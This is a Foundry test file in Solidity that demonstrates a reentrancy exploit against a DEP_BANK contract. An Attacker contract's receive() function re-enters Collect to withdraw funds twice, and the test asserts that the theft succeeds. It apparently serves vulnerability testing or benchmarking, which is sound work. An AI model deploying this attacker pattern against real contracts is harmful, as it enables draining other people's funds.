
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {

    DEP_BANK public bank;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        bank = new DEP_BANK();
        bank.SetLogFile(address(log));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 stateVal) public {
        
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 2);
        vm.assume(stateVal > attackVal);
        uint256 depositAmount = attackVal * 2;
        vm.assume(depositAmount >= stateVal);
        vm.assume(depositAmount < stateVal + attackVal);
        vm.assume(depositAmount > 0);
        vm.assume(attackVal * 3 < type(uint256).max);

        bank.SetMinSum(stateVal);
        bank.Initialized();
        
        vm.deal(address(bank), attackVal * 3); 
        
        vm.deal(address(_attacker), attackVal * 3);

        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: depositAmount}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        bank = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedVal = val;

        bank.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (finalBalance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.Collect(storedVal);
        }
    }
}
